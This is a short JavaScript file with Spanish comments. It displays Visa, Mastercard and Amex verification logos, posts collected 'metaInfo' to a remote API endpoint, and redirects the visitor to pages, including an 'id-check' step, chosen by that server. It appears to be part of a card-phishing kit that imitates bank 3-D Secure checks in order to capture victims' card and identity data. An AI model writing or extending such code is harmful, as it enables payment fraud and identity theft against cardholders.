const companyLoader = document.querySelector('#company-loader');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');
}

// Enviar info
fetch(`${API_URL}/generals`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(info.metaInfo)
})
    .then(response => response.json())
    .then(result => {
        // Manejo de respuetas del servidor
        console.log('Respuesta del servidor:', result.redirect_to);

        if(result.redirect_to.split('-')[0] === 'checker'){
            console.log(result.redirect_to);
            info.checkerInfo.mode = result.redirect_to.split('-')[1];
            LS.setItem('info', JSON.stringify(info));
            
            window.location.href = 'id-check.html';

            return;
        }

        window.location.href = result.redirect_to+'.html';
    })
    .catch(error => {
        console.log('Error en la solicitud:', error);
    });